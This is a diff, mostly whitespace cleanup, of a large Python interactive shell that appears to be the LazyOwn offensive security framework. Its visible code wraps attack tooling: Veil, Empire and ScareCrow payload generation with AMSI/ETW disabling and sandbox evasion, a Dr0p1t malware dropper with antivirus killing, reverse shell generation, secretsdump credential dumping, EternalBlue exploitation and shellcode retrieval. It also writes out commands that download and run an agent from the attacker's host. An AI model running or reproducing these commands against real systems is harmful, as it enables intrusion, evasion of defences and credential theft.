-        of the target name with a given list of characters. The combinations include single, double, triple, fourth, 
-        fifth, sixth, and intercalated character variations. The generated passwords are saved to the specified 
+        This function prompts the user for a target name and a wordlist name, then generates various combinations
+        of the target name with a given list of characters. The combinations include single, double, triple, fourth,
+        fifth, sixth, and intercalated character variations. The generated passwords are saved to the specified
         wordlist file.
 
         :param line: Not used in this function.
@@ -12833,7 +12835,7 @@ class LazyOwnShell(cmd2.Cmd):
         :returns: None
 
         Manual execution:
-        To manually generate a wordlist, run the script and follow the prompts to enter the target name, 
+        To manually generate a wordlist, run the script and follow the prompts to enter the target name,
         wordlist name, and additional characters if desired.
 
         For example:
@@ -12843,7 +12845,7 @@ class LazyOwnShell(cmd2.Cmd):
             Do you want to add more characters in char List[y/n] ::: y
             Enter characters by commas(Ex. : ^,&,*,) ::: ^,&,*
         """
-        
+
         def single_combo(name, characters, file, total, flag):
             """
             Generates single character combinations with the target name.
@@ -12968,7 +12970,7 @@ class LazyOwnShell(cmd2.Cmd):
                                     file.write(cpass1 + "\n")
                                     total += 1
             return total
-        
+
         def sixth_combo(name, characters, file, total, flag):
             """
             Generates sixth character combinations with the target name, adding uppercase characters.
@@ -12982,7 +12984,7 @@ class LazyOwnShell(cmd2.Cmd):
             :returns: Updated total of passwords generated.
             """
             from itertools import product
-            for combo in product(characters, repeat=6):  
+            for combo in product(characters, repeat=6):
                 combo_str = ''.join(combo)
                 cpass1 = name + combo_str.upper()
                 if flag:
@@ -12997,8 +12999,8 @@ class LazyOwnShell(cmd2.Cmd):
         def intercalate_combo(name, characters, file, total, flag):
             """
             Generates combinations of the target name and character list, intercalating uppercase and lowercase characters.
-            
-            This function generates combinations where each character in the string alternates between uppercase and 
+
+            This function generates combinations where each character in the string alternates between uppercase and
             lowercase. It also allows for the addition of the target name at the beginning or the end of the string.
 
             :param name: Target name to use in the combinations.
@@ -13009,12 +13011,12 @@ class LazyOwnShell(cmd2.Cmd):
 
             :returns: Updated total of passwords generated.
             """
-                        
+
             def alternate_case(s):
                 """Helper function to alternate the case of characters in a string."""
                 return ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(s))
-            
-            for combo in product(characters, repeat=6): 
+
+            for combo in product(characters, repeat=6):
                 combo_str = ''.join(combo)
                 cpass1 = name + alternate_case(combo_str)
                 if flag:
@@ -13029,7 +13031,7 @@ class LazyOwnShell(cmd2.Cmd):
         def expand_regex(regex):
             """
             Expands a regular expression into a list of characters.
-            
+
             :param regex: Regular expression string to expand.
             :returns: List of characters matching the regular expression.
             """
@@ -13060,7 +13062,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("Enter characters by commas(Ex. : ^,&,*,): ")
         more_chars = input("    ╰─ ").strip().split(',')
         char_list.extend(more_chars)
-        
+
         print_msg("Do you want to add more characters in char List[y/n]: ")
         add_more = input("    ╰─ ").strip().lower()
 
@@ -13082,7 +13084,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Wordlist {wordlist_name} generated with {total_passwords} passwords.")
         return
-    
+
     @cmd2.with_category(recon_category)
     def do_trace(self, line):
         """
@@ -13153,14 +13155,14 @@ class LazyOwnShell(cmd2.Cmd):
         if not check_lhost(lhost):
             return
         if not check_lport(lport):
-            return    
+            return
 
         if not is_binary_present("Veil-Evasion.py"):
             print_warn("Veil-Evasion is not installed. Installing Veil-Evasion...")
             self.cmd("git clone https://github.com/Veil-Framework/Veil.git external/.exploit/Veil")
             self.cmd("cd external/.exploit/Veil && ./config/setup.sh --force --silent")
-        
-        
+
+
         options = {
             "python_meterpreter_rev_https": {
                 "cmd": "Veil-Evasion.py -p python/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
@@ -13197,9 +13199,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Generating payload with Veil-Evasion: {veil_command}")
         self.cmd(veil_command)
-        
+
         return
-    
+
     @cmd2.with_category(command_and_control_category)
     def do_empire(self, line):
         """
@@ -13209,12 +13211,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         :returns: None
         """
-        
+
         # Check if Empire is installed
         if not is_binary_present("powershell-empire"):
             print_error("PowerShell Empire is not installed. Please install it first.")
             return
-        
+
         # Define options for different payload types
         options = {
             "windows_launcher_bat": "launcher bat",
@@ -13224,7 +13226,7 @@ class LazyOwnShell(cmd2.Cmd):
             "windows_macro": "macro",
             "windows_dll": "dll"
         }
-        
+
         # User input for selecting payload type and parameters
         print_warn("Select the payload type:")
         for i, option in enumerate(options.keys(), start=1):
@@ -13247,9 +13249,9 @@ class LazyOwnShell(cmd2.Cmd):
         empire_command = f"sudo powershell-empire client -p {options[selected_type]} -lhost {params['lhost']} -lport {params['lport']} -o {params['output_file']}"
 
         self.cmd(empire_command)
-        
+
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_evil_ssdp(self, line):
         """
@@ -13323,7 +13325,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             if options[option_choice] == "Load Config":
                 use_existing_config = input("    [!] Do you want to load an existing config file? (yes/no): ").strip().lower()
-                
+
                 if use_existing_config == "yes":
                     config = input("    [!] Enter the name of the config file: ").strip()
                     if not config:
@@ -13410,7 +13412,7 @@ class LazyOwnShell(cmd2.Cmd):
         :returns: None
         """
         json_files = glob.glob("*payload*.json")
-        
+
         if not json_files:
             print_error("No JSON payload files found.")
             return
@@ -13430,9 +13432,9 @@ class LazyOwnShell(cmd2.Cmd):
                     rhost = data.get("rhost", "Unknown RHOST")
                     rport = data.get("rport", "Unknown RPORT")
                     node_label = f"{url}\nRHOST: {rhost}\nRPORT: {rport}"
-                    node_name = os.path.splitext(json_file)[0] 
+                    node_name = os.path.splitext(json_file)[0]
                     graph_content += f'"{node_name}" [label="{node_label}"];\n'
-                    child_nodes.append(node_name)  
+                    child_nodes.append(node_name)
 
             except json.JSONDecodeError:
                 print_error(f"Error decoding JSON in file: {json_file}")
@@ -13452,7 +13454,7 @@ class LazyOwnShell(cmd2.Cmd):
             dot_file.write(graph_content)
 
         os.system("dot -Tpng sessions/graph.dot -o sessions/graph.png -Gbgcolor=lightgrey -Ecolor=blue")
-        
+
         return
 
     @cmd2.with_category(scanning_category)
@@ -13623,7 +13625,7 @@ class LazyOwnShell(cmd2.Cmd):
             }
 
             options = []
-         
+
             if action:
                 print_warn(f"Select the options for {action}:")
                 for k, option in enumerate(options_dict[protocol][action], start=1):
@@ -13691,7 +13693,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd("go get github.com/yeka/zip")
             self.cmd("go get github.com/josephspurrier/goversioninfo")
             self.cmd("mkdir -p ~/bypass && cd ~/bypass && git clone https://github.com/optiv/ScareCrow && cd ScareCrow && go build ScareCrow.go")
-            
+
             command = """
             bash -c '
             if [[ "$SHELL" == */bash ]]; then
@@ -13708,28 +13710,28 @@ class LazyOwnShell(cmd2.Cmd):
         domain = self.params["domain"]
         print_warn("Select the mode you want to use:")
         options = [
-            "Evasion (Disk, KnownDLL, None)", 
+            "Evasion (Disk, KnownDLL, None)",
             "Exec (RtlCopy, ProcessInjection, NtQueueApcThreadEx, VirtualAlloc)",
-            "Loader (binary, control, dll, excel, msiexec, wscript)", 
-            "Clone Cert", 
+            "Loader (binary, control, dll, excel, msiexec, wscript)",
+            "Clone Cert",
             "Custom Config File",
-            "Enable Console Mode", 
-            "Delivery (bits, hta, macro)", 
-            "Domain Cert", 
+            "Enable Console Mode",
+            "Delivery (bits, hta, macro)",
+            "Domain Cert",
             "Encryption Mode (AES, ELZMA, RC4)",
-            "Export (DLL)", 
-            "Injection Path", 
-            "Disable AMSI", 
-            "Disable ETW", 
-            "Disable Signing", 
+            "Export (DLL)",
+            "Injection Path",
+            "Disable AMSI",
+            "Disable ETW",
+            "Disable Signing",
             "Disable Sleep Delay",
-            "Obfuscation", 
-            "Set Output Path", 
-            "Sandbox Evasion", 
-            "Set URL", 
+            "Obfuscation",
+            "Set Output Path",
+            "Sandbox Evasion",
+            "Set URL",
             "Set Valid Cert"
         ]
-        
+
         for i, option in enumerate(options, start=1):
             print_msg(f"{i}. {option}")
 
@@ -13786,7 +13788,7 @@ class LazyOwnShell(cmd2.Cmd):
                 scarecrow_command += f" -url {url}"
 
 
-            
+
             print_msg(f"Running ScareCrow with command: {scarecrow_command}")
             self.cmd(f"{scarecrow_command} ")
 
@@ -13833,7 +13835,7 @@ class LazyOwnShell(cmd2.Cmd):
         emails = generate_emails(full_name, domain)
         file_name = f"emails_{full_name.replace(' ', '_')}_{domain}.txt"
         file_path = os.path.join("sessions", file_name)
-            
+
         with open(file_path, 'w') as f:
             for email in emails:
                 f.write(email + '\n')
@@ -13845,7 +13847,7 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(reporting_category)
     def do_eyewitness(self, line):
         """
-        Executes EyeWitness to capture screenshots from a list of URLs. 
+        Executes EyeWitness to capture screenshots from a list of URLs.
         You need to provide a file containing URLs or a single URL to capture.
         :param line: Not used directly but reserved for future use.
         :returns: None
@@ -13856,7 +13858,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_warn("Select the input option for EyeWitness:")
         options = [
-            "File containing URLs", 
+            "File containing URLs",
             "Single URL"
         ]
 
@@ -13884,7 +13886,7 @@ class LazyOwnShell(cmd2.Cmd):
                 timeout = input("    [!] Enter timeout in seconds: ").strip()
                 eyewitness_command += f" --timeout {timeout}"
 
-            
+
             output_dir = input("    [!] Enter output directory name: (default: sessions/eye)").strip() or "sessions/eye"
             eyewitness_command += f" -d {output_dir}"
             eyewitness_command += f" --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'"
@@ -13895,7 +13897,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         except ValueError:
             print_error("Invalid input. Please enter a valid number.")
-        return    
+        return
 
     @cmd2.with_category(exfiltration_category)
     def do_secretsdump(self, line):
@@ -13922,7 +13924,7 @@ class LazyOwnShell(cmd2.Cmd):
         wordlist = self.params["wordlist"]
         dominio = get_domain(url)
 
-        path_cred = "sessions/credentials.txt"        
+        path_cred = "sessions/credentials.txt"
         if line:
             if line.startswith("sam"):
                 if os.path.exists("sessions/SYSTEM"):
@@ -13940,7 +13942,7 @@ class LazyOwnShell(cmd2.Cmd):
                     return
                 else:
                     print_error("You need credentials.txt or SAM and SYSTEM files")
-        
+
             elif line.startswith("creds"):
                 with open(path_cred, "r") as file:
                     for file_line in file:
@@ -14000,7 +14002,7 @@ class LazyOwnShell(cmd2.Cmd):
         dominio = get_domain(url)
         domain = input(f"    [!] Domain: (default: {dominio}) ").strip() or dominio
 
-        path_cred = "sessions/credentials.txt"        
+        path_cred = "sessions/credentials.txt"
 
         if not os.path.exists(path_cred):
             username = input("    [!] Username: ").strip()
@@ -14095,7 +14097,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not hosts:
             print_error("    [!] Hosts cannot be empty!")
             return
-        
+
         ports = input("    [!] Enter the ports to scan (comma-separated or range): ").strip() or "80,443,22,21,23,25,110,143,53,3306,8080,3389,135,139,445,993,995,1723,111,5900,1025,465,587,49152,49153,49154,49155,49156,49157,548,631,993,2049,444,5000,5060,5800,53,111,179,123,137,138,69,514,2049,520,162,4500"
 
         output_file = input("    [!] Enter the output file : ").strip() or hosts.replace(",","_")
@@ -14132,7 +14134,7 @@ class LazyOwnShell(cmd2.Cmd):
         cmd = input(f"    [!] Enter the command to execute (default: {command}): ").strip() or command
         host = clean_url(host)
         response, random_string = generate_http_req(host, port, uri, custom_header, cmd)
-        
+
         if response.status_code == 200 and (random_string is None or random_string in response.text):
             print_msg(f"    [*] The target {host}:{port} appears to be vulnerable to Shellshock!")
             if cmd:
@@ -14145,11 +14147,11 @@ class LazyOwnShell(cmd2.Cmd):
     def do_generate_revshell(self, line):
         """
         Generate a reverse shell in various programming languages.
-        
-        This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, Telnet, NodeJS, Golang, PowerShell) 
-        and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding 
+
+        This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, Telnet, NodeJS, Golang, PowerShell)
+        and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding
         reverse shell command.
-        
+
         :param line: Not used in this implementation.
         :returns: None
         """
@@ -14169,7 +14171,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("Choose the type of reverse shell to generate:")
         for key, value in shell_options.items():
             print_msg(f"{key}. {value}")
-        
+
         choice = input("    [!] Enter your choice (1-10): ").strip()
         if choice not in shell_options:
             print_error("Invalid choice. Please enter a number between 1 and 10.")
@@ -14215,7 +14217,7 @@ class LazyOwnShell(cmd2.Cmd):
         of the subdomain enumeration is saved in a session-specific text file.
 
         Steps performed by the function:
-        
+
         1. **Check if 'alterx' is installed:**
         - Uses `is_binary_present("alterx")` to verify if the 'alterx' binary is available in the system.
         - If the binary is not found, the function prints a warning and proceeds to download and install 'alterx'.
@@ -14225,29 +14227,29 @@ class LazyOwnShell(cmd2.Cmd):
         - Downloads the 'alterx' version 0.0.4 (Linux 64-bit) from GitHub and extracts it into the 'alterx' directory.
 
         3. **Add 'alterx' to system PATH:**
-        - Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH 
-            by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx' 
+        - Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH
+            by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx'
             can be executed from any directory.
 
         4. **Obtain the domain:**
         - Retrieves the URL from the class parameter `self.params["url"]`.
         - Extracts the domain from the URL using `get_domain(url)`.
-        - If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to 
+        - If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to
             the previously extracted domain.
 
         5. **Execute 'alterx' on the domain:**
         - Executes the 'alterx' tool on the specified domain via a system command.
-        - The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename 
+        - The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename
             `subdomain_dic_<domain>.txt`.
 
         Parameters:
         - line (str): The domain on which to run 'alterx'. If empty, the function prompts the user for input.
-        
+
         Returns:
         - None: The function performs its operations but does not return any value.
 
         Dependencies:
-        - The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()` 
+        - The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()`
         and `get_domain()` helper functions.
         """
         if not is_binary_present("alterx"):
@@ -14281,11 +14283,11 @@ class LazyOwnShell(cmd2.Cmd):
     def do_allin(self, line):
         """
         Execute the AlliN.py tool with various scan modes and parameters.
-        
-        This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan), 
-        and then asks for the necessary parameters (host, ports, project name, etc.). 
+
+        This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan),
+        and then asks for the necessary parameters (host, ports, project name, etc.).
         Based on the user's input, it generates the corresponding command and executes it.
-        
+
         :param line: Not used in this implementation.
         :returns: None
         """
@@ -14318,7 +14320,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("Choose the type of scan to perform with AlliN.py:")
         for key, value in scan_options.items():
             print_msg(f"{key}. {value}")
-        
+
         choice = input("    [!] Enter your choice (1-6): ").strip()
         if choice not in scan_options:
             print_error("Invalid choice. Please enter a number between 1 and 6.")
@@ -14328,7 +14330,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not host:
             print_error("Host is required.")
             return
-        
+
         project = input("    [!] Enter the project name (default: scan_project): ").strip() or f"scan_project_{host}"
         timeout = input("    [!] Enter timeout in seconds (default: 3): ").strip() or "3"
         threads = input("    [!] Enter number of threads (default: 200): ").strip() or "200"
@@ -14341,7 +14343,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             python = "python3"
         command = f"cd && cd AlliN && {python} AlliN.py --host {host} --timeout {timeout} -t {threads} --project {sessions}{project} -m {scan_options[choice]}"
-        
+
         if ports:
             command += f" -p {ports}"
         if proxy:
@@ -14355,9 +14357,9 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Execute the Dr0p1t tool to create a stealthy malware dropper.
 
-        This function prompts the user to input the necessary parameters for 
-        generating a dropper, including the malware URL, persistence options, 
-        and additional configurations. Based on the user's input, it constructs 
+        This function prompts the user to input the necessary parameters for
+        generating a dropper, including the malware URL, persistence options,
+        and additional configurations. Based on the user's input, it constructs
         the command and executes it.
 
         :param line: Not used in this implementation.
@@ -14408,7 +14410,7 @@ class LazyOwnShell(cmd2.Cmd):
             icon_command = ""
 
         command = f"cd && cd Dr0p1t-Framework && python3 Dr0p1t.py {malware_url} {persistence_command} {kill_av_command} {run_script_command} {icon_command}".strip()
-        
+
         print_msg(f"Generated command: {command}")
         self.cmd(command)
         return
@@ -14507,7 +14509,7 @@ class LazyOwnShell(cmd2.Cmd):
                 for shellcode in response:
                     sc = shellcode.split('::::')
                     print_msg(f"Title: {sc[2]}, Platform: {sc[1]}, ID: {sc[3]}, Author: {sc[0]}, URL: {sc[4]}")
-                
+
                 shellcode_id = input("[*] Select shellcode id: ")
                 subprocess.call("clear", shell=True)
                 shellcode_url = f"http://shell-storm.org/shellcode/files/shellcode-{shellcode_id}.html"
@@ -14516,7 +14518,7 @@ class LazyOwnShell(cmd2.Cmd):
                 shellcode = extract(shellcode_response, False)
                 shellcode = clean_html(shellcode)
                 print_msg(shellcode)
-                
+
                 write_to_file = input("Do you want to write the shellcode to a file? (y/n): ").strip().lower()
                 if write_to_file == 'y':
                     path = os.getcwd()
@@ -14540,7 +14542,7 @@ class LazyOwnShell(cmd2.Cmd):
         :type line: str
         :returns: None
         """
-        
+
         lhost = self.params["lhost"]
         if not lhost:
             print_error("You must set lhost ex: assign lhost 10.10.10.10 or payload (alias p)")
@@ -14562,7 +14564,7 @@ class LazyOwnShell(cmd2.Cmd):
         lport = line.strip()
         command_win = f"iwr -uri http://{lhost}/agent.exe -OutFile a.exe; .\\a.exe -connect {lhost}:{lport}"
         command_linux = f"curl http://{lhost}/agent -o a; chmod +x a; ./a -connect {lhost}:{lport}"
-        
+
         print_msg(f"Windows Command: {command_win}\nLinux Command: {command_linux}")
         choice = input("Enter 1 to windows or 2 to linux: ")
         if choice == "1":
@@ -14575,7 +14577,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"cd sessions && ./proxy -laddr \"0.0.0.0:{lport}\" -selfcert")
         print_msg(f"Ligolo server is running on port {RED}{lport}{RESET}. You can stop it by terminating the process.")
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_addusers(self, line):
         """
@@ -14627,7 +14629,7 @@ class LazyOwnShell(cmd2.Cmd):
                 self.cmd(f"wget -O {binary_path} {binary_url}")
                 self.cmd(f"chmod +x {binary_path}")
                 print_msg(f"Downloaded and made executable: {binary_path}")
-            
+
             elif choice == '2':
                 repo_url = "https://github.com/ropnop/go-windapsearch.git"
                 project_dir = f"/home/{username}/bin/go-windapsearch"
@@ -14636,17 +14638,17 @@ class LazyOwnShell(cmd2.Cmd):
                     os.makedirs(project_dir)
                 command = """go get -u -d github.com/magefile/mage ;
                 cd $GOPATH/src/github.com/magefile/mage ;
-                go run bootstrap.go""" 
+                go run bootstrap.go"""
                 self.cmd(command)
                 self.cmd(f"git clone {repo_url} {project_dir}")
                 self.cmd(f"cd {project_dir} && go get github.com/magefile/mage")
                 self.cmd(f"cd {project_dir} && mage build")
                 print_msg("Compiled windapsearch from source.")
                 self.cmd(f"{os.path.join(project_dir, 'windapsearch')} --version")
-            
+
             else:
                 print_error("Invalid choice. Please enter 1 or 2.")
-        
+
 
         domain = get_domain(self.params["url"]) or input("    [!] Enter the FQDN of the domain (e.g., 'lab.example.com'): ").strip()
         rhost = self.params["rhost"]
@@ -14669,7 +14671,7 @@ class LazyOwnShell(cmd2.Cmd):
                         else:
                             username = line
                         password = params[1].replace("\n", "")
-        else:            
+        else:
             command = f"windapsearch --dc {rhost} --full -m users -o sessions/{rhost}_windap.json -j y -v y"
             self.cmd(command)
             self.logcsv(f"windapsearch {command}")
@@ -14679,31 +14681,31 @@ class LazyOwnShell(cmd2.Cmd):
 
         use_ntlm = input("    [!] Use NTLM auth? (y/n, default: n): ").strip().lower() or 'n'
         ntlm_command = "--ntlm" if use_ntlm == 'y' else ""
-        
+
         use_ldaps = input("    [!] Use LDAPS? (y/n, default: n): ").strip().lower() or 'n'
         ldaps_command = "--secure" if use_ldaps == 'y' else ""
-        
+
         output_file = input("    [!] Enter the output file (optional): ").strip() or f"sessions/{domain}_windap.json"
         output_command = f"-o {output_file}" if output_file else ""
-        
+
         json_output = input("    [!] Output in JSON format? (y/n, default: n): ").strip().lower() or 'n'
         json_command = "-j" if json_output == 'y' else ""
-        
+
         verbose = input("    [!] Enable verbose logging? (y/n, default: n): ").strip().lower() or 'n'
         verbose_command = "-v" if verbose == 'y' else ""
-        
+
         module = input("    [!] Enter the module to use (e.g., 'admin-objects' , 'computers', 'custom'   , 'dns-names', 'dns-zones', 'domain-admins', 'gpos'' , 'groups'   , 'members'  , 'metadata' , 'privileged-users , 'search'   , 'unconstrained', 'user-spns', 'users' ): ").strip() or 'users'
         if not module:
             print_error("Module is required.")
             return
-        
+
         module_options = input("    [!] Enter any additional options for the module (optional): ").strip()
 
         command = (
             f"windapsearch -d {domain} -u {username} -p {password} {ntlm_command} {ldaps_command} "
             f"{output_command} {json_command} {verbose_command} -m {module} {module_options}"
         ).strip()
-        
+
         print_msg(f"Generated command: {command}")
         self.cmd(command)
         self.logcsv(f"windapsearch {command}")
@@ -14764,7 +14766,7 @@ class LazyOwnShell(cmd2.Cmd):
         Execute the Shadowsocks tool to create a secure tunnel for network traffic.
 
         This function allows the user to specify various parameters for configuring and running the Shadowsocks client
-        or server. It handles user input for server address, port, password, encryption method, and other options, 
+        or server. It handles user input for server address, port, password, encryption method, and other options,
         constructs the command, and executes it.
 
         :param line: Not used in this implementation.
@@ -14781,10 +14783,10 @@ class LazyOwnShell(cmd2.Cmd):
             if choice == '1':
                 self.cmd("sudo apt-get install shadowsocks-libev -y")
                 print_msg("Shadowsocks installed using package manager.")
-            
+
             elif choice == '2':
                 self.cmd("cargo install shadowsocks-rust")
-            
+
             else:
                 print_error("Invalid choice. Please enter 1 or 2.")
                 return
@@ -14792,7 +14794,7 @@ class LazyOwnShell(cmd2.Cmd):
             mode = input("    [!] Choose mode (server 1 or client 2): ").strip().lower()
         else:
             mode = line
-        
+
         if mode == '1':
             lport = self.params["lport"]
             password = input("    [!] Enter the Shadowsocks password: ").strip()
@@ -14847,13 +14849,13 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn("Kusanagi binary not found. installing")
             self.cmd("pip3 install kusanagi")
             return
-        
+
         print_msg("Kusanagi - Payload Generator and Injector")
         if not line:
             mode = input("    [!] Choose mode (cmd 1, code 2): ").strip().lower()
         else:
             mode = line
-        
+
         if mode == '1':
             print_msg("Command Injection selected.")
             rhost = input(f"    [!] Enter the target host [default: {self.params['rhost']}]: ").strip() or self.params['rhost']
@@ -14904,7 +14906,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(command)
         return
 
-    @cmd2.with_category(recon_category)    
+    @cmd2.with_category(recon_category)
     def do_windapsearchscrapeusers(self, line):
         """
         Extracts usernames from a JSON output generated by go-windapsearch and appends them
@@ -14925,22 +14927,22 @@ class LazyOwnShell(cmd2.Cmd):
         try:
             with open(json_file, 'r') as f:
                 data = json.load(f)
-            
+
             user_file = "sessions/users.txt"
             with open(user_file, 'a') as uf:
                 for entry in data:
                     if 'sAMAccountName' in entry:
                         uf.write(entry['sAMAccountName'] + '\n')
                         print_msg(f"Agregado usuario: {entry['sAMAccountName']}")
-            
+
             print_msg(f"Todos los usuarios se han agregado a {user_file}.")
-        
+
         except json.JSONDecodeError:
             print_error(f"Error: No se pudo decodificar el archivo {json_file}. Asegúrate de que sea un JSON válido.")
         except Exception as e:
-            print_error(f"Error: {str(e)}")        
+            print_error(f"Error: {str(e)}")
 
-    @cmd2.with_category(exploitation_category)   
+    @cmd2.with_category(exploitation_category)
     def do_downloader(self, line):
         """
         Generate a downloader command for files in the sessions directory.
@@ -14957,17 +14959,17 @@ class LazyOwnShell(cmd2.Cmd):
             for file in files:
                 if not any(file.endswith(ext) for ext in excluded_extensions):
                     file_list.append(os.path.join(root, file))
-        
+
         if not file_list:
             print_error("No files found in the sessions directory.")
             return
-  
+
         print_msg("Select a file to download:")
         for idx, file in enumerate(file_list, 1):
             print_msg(f"  {idx}) {file}")
 
         file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
-        
+
         try:
             file_choice = int(file_choice)
             if file_choice < 1 or file_choice > len(file_list):
@@ -14977,8 +14979,8 @@ class LazyOwnShell(cmd2.Cmd):
         except ValueError:
             print_error("Invalid input. Please enter a number.")
             return
-        
-        
+
+
         print_msg("Select the download method:")
         methods = [
             "curl",
@@ -15003,11 +15005,11 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("Invalid input. Please enter a number.")
             return
 
-        
+
         lhost = self.params["lhost"]
-        
-        output_file = line.strip() if line else os.path.basename(selected_file)  
-        
+
+        output_file = line.strip() if line else os.path.basename(selected_file)
+
         command = ""
         if selected_method == "curl":
             command = f"curl -o {output_file} http://{lhost}/{selected_file}"
@@ -15027,7 +15029,7 @@ class LazyOwnShell(cmd2.Cmd):
         copy2clip(command)
         print_msg(f"Generated command copied to clipboard: {command}")
 
-    @cmd2.with_category(scanning_category)   
+    @cmd2.with_category(scanning_category)
     def do_ldapsearch(self, line):
         """
         Executes an LDAP search against a target remote host (rhost) and saves the results.
@@ -15048,7 +15050,7 @@ class LazyOwnShell(cmd2.Cmd):
         9. Extracts `userPrincipalName` attributes from the log, parses them, and appends the usernames (without domain) to a users.txt file for further analysis.
 
         This function is useful in penetration testing engagements where LDAP enumeration is part of the reconnaissance phase. It automates LDAP queries and extracts useful user information, which could assist in credential harvesting, password spraying, or other user-based attacks.
-        """        
+        """
         path = os.getcwd()
         rhost = self.params["rhost"]
         if not check_rhost(rhost):
@@ -15077,7 +15079,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"tac sessions/users.txt | grep -v '^$' | sponge sessions/users.txt")
         return
 
-    @cmd2.with_category(exploitation_category)   
+    @cmd2.with_category(exploitation_category)
     def do_eternal(self, line):
         """
         Automates the EternalBlue (MS17-010) exploitation process using Metasploit.
@@ -15096,7 +15098,7 @@ class LazyOwnShell(cmd2.Cmd):
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
         lport = self.params["lport"]
-        
+
 
         if not rhost or not lhost:
             print_warn("RHOST and LHOST must be specified.")
@@ -15122,12 +15124,12 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Executed EternalBlue exploitation on {rhost} with listener {lhost}.")
         return
 
-    @cmd2.with_category(recon_category)  
+    @cmd2.with_category(recon_category)
     def do_cve(self, line):
         """
         Search for a CVE using the CIRCL API.
 
-        This function sends a GET request to the CIRCL API to retrieve CVE details 
+        This function sends a GET request to the CIRCL API to retrieve CVE details
         and prints relevant information to the screen.
 
         :param line: A string containing the CVE ID (optional).
@@ -15141,11 +15143,11 @@ class LazyOwnShell(cmd2.Cmd):
 
         try:
             response = requests.get(url)
-            
+
             if response.status_code != 200:
                 print_error(f"Failed to retrieve data: HTTP {response.status_code}")
                 return
-            
+
             cve_data = response.json()
 
             cwe = cve_data.get("cwe", "No CWE info")
@@ -15163,7 +15165,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"[*] Assigner: {assigner}")
             print_msg(f"[*] Published: {published}")
             print_msg(f"[*] Modified: {modified}")
-        
+
         except requests.exceptions.RequestException as req_e:
             print_error(f"A request error occurred: {req_e}")
         except ValueError as json_e:
@@ -15171,7 +15173,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"An error occurred: {e}")
 
-    @cmd2.with_category(exfiltration_category)      
+    @cmd2.with_category(exfiltration_category)
     def do_evidence(self, line=''):
         """
         Compresses the 'sessions' folder and encodes it into a video using the lazyown_infinitestorage.py script.
@@ -15204,9 +15206,9 @@ class LazyOwnShell(cmd2.Cmd):
         sessions_dir = 'sessions'
         zip_file_path = 'sessions.zip'
 
-        
-        if line and line.startswith("decode"):  
-            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(('.mp4', '.mkv', '.avi'))]  
+
+        if line and line.startswith("decode"):
+            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(('.mp4', '.mkv', '.avi'))]
             if not video_files:
                 print_error("No hay videos en la carpeta 'sessions'.")
                 return
@@ -15215,7 +15217,7 @@ class LazyOwnShell(cmd2.Cmd):
             for idx, video in enumerate(video_files, start=1):
                 print_msg(f"{idx}: {video}")
 
-            
+
             choice = input("Elige el número del video que deseas decodificar: ")
             try:
                 choice = int(choice)
@@ -15231,43 +15233,43 @@ class LazyOwnShell(cmd2.Cmd):
             if not os.path.isfile(video_full_path):
                 print_error(f"Error: {video_full_path} no existe.")
                 return
-            
+
             command = [
                 'python3', 'modules_ext/lazyown_infinitestorage/lazyown_infinitestorage.py',
                 '--mode', 'decode',
                 '--input', video_full_path,
-                '--output', 'sessions/decoded_output',  
-                '--frame_size', '1920', '1080',  
-                '--fps', '25'  
+                '--output', 'sessions/decoded_output',
+                '--frame_size', '1920', '1080',
+                '--fps', '25'
             ]
             print_msg(f"Decodificando {video_file}...")
 
-        else:  
-            
+        else:
+
             self.cmd(f'zip -r {zip_file_path} {sessions_dir}')
             print_msg(f"Carpeta {sessions_dir} comprimida en {zip_file_path}.")
 
-            
+
             command = [
